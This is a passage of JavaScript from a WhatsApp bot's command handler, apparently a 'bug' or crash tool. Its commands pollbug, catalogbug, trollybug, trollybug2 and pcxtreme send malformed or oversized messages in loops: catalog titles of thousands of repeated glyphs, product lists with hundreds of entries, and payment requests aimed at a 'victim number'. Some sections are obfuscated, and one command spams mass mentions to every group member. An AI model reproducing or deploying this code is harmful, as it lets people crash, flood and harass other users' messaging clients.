function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await ElgazarBot[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
case 'تاك': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (args.length == 0) return m.reply(`اكتب ${prefix+command} والعدد\nمثال ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
let teks = `══✪〘 *منشن للكل* 〙✪══
 ${themeemoji} *الرساله : ${q ? q : 'مفيش رساله'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
ElgazarBot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
}
break
case 'pollbug': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": ownername,
"options": [
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
},
{
"optionName": `${themeemoji}`
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
ElgazarBot.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
xbug('Successful in sending the poll bug')
}
break

case 'catalogbug': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: ElgazarBot.waUploadToServer })
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `[⫹⫺ - 㑒 ${botname}]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
"description": wm,
"currencyCode": "INR",
"footerText": ownername,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": wm,
"url": websitex
},
"businessOwnerJid": "916909137213@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
ElgazarBot.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'trollybug2': {

                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await ElgazarBot[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});ElgazarBot['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
}
}
break

case 'trollybug': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
a = await ElgazarBot.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${botname}`,jpegThumbnail: thumb}}}
var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": xpicvirus,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": ownername,
"orderTitle": wm, // 
"sellerJid": " 916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
ElgazarBot.relayMessage(m.chat, xeonoporwot.message, { messageId: xeonoporwot.key.id })
}
}
break
case 'pcxtreme': {

                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909137213s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
num = q.split('|')[0]
amount = q.split('|')[1]
for (let i = 0; i < amount; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: ElgazarBot.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "100",
"extendedTextMessage": {
